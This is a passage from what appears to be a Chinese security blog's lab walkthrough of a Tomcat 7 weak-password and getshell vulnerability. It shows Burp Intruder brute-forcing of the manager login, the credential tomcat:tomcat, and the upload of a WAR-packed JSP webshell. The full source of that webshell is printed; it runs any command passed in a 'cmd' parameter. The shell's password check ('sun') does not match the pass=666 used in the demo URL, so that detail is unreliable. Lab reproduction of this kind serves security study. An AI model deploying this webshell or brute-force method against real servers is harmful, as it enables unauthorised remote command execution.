href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818131137054.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818131137054.png" alt="image-20220818131137054"></a></p><p>image-20220818131137054</p><p>发到测试器进行爆破</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818131508992.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818131508992.png" alt="image-20220818131508992"></a></p><p>image-20220818131508992</p><p>选择自定义迭代器并导入用户名字典</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133313901.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818133313901.png" alt="image-20220818133313901"></a></p><p>image-20220818133313901</p><p>导入：</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133327878.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818133327878.png" alt="image-20220818133327878"></a></p><p>image-20220818133327878</p><p>导入密码字典</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133338417.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818133338417.png" alt="image-20220818133338417"></a></p><p>image-20220818133338417</p><p>进行base64编码</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133357998.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818133357998.png" alt="image-20220818133357998"></a></p><p>image-20220818133357998</p><p>url编码这些字符不选</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818135945044.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818135945044.png" alt="image-20220818135945044"></a></p><p>image-20220818135945044</p><p>设置线程，防止被封</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818134605079.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818134605079.png" alt="image-20220818134605079"></a></p><p>image-20220818134605079</p><p>开始测试</p><p>获得弱口令为tomcat:tomcat</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818154626194.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818154626194.png" alt="image-20220818154626194"></a></p><p>image-20220818154626194</p><p>登录后台</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818141322866.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818141322866.png" alt="image-20220818141322866"></a></p><p>image-20220818141322866</p><p>找到上传点</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818141402755.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818141402755.png" alt="image-20220818141402755"></a></p><p>image-20220818141402755</p><p>将jsp木马压缩成zip文件，然后将后缀改为war</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818151948255.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818151948255.png" alt="image-20220818151948255"></a></p><p>image-20220818151948255</p><p>小马代码如下</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle">&lt;%<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;sun&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pass&quot;</span>)))&#123;<br>java.io.InputStream in = <span class="hljs-keyword">Runtime</span>.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br><span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<br><span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];<br>out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br><span class="hljs-keyword">while</span>((a=in.<span class="hljs-keyword">read</span>(b))!=-<span class="hljs-number">1</span>)&#123;<br>out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">new</span> String(b));<br>&#125;<br>out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br>%&gt;<br><br>JSP<br></code></pre></td></tr></table></figure><p>进行上传</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818152031725.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818152031725.png" alt="image-20220818152031725"></a></p><p>image-20220818152031725</p><p>成功上传，访问<a href="http://192.168.129.130:8080/shell/shell.jsp?pass=666&cmd=pwd">http://192.168.129.130:8080/shell/shell.jsp?pass=666&amp;cmd=pwd</a></p><p>（pass参数为密码，cmd参数为命令)</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818152255496.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818152255496.png" alt="image-20220818152255496"></a></p><p>image-20220818152255496</p><h5 id="关闭环境"><a href="#关闭环境" class="headerlink" title="关闭环境"></a>关闭环境</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker-compose down <span class="hljs-attr">--rmi</span> <span class="hljs-attribute">all</span> -v #关闭并删除环境<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
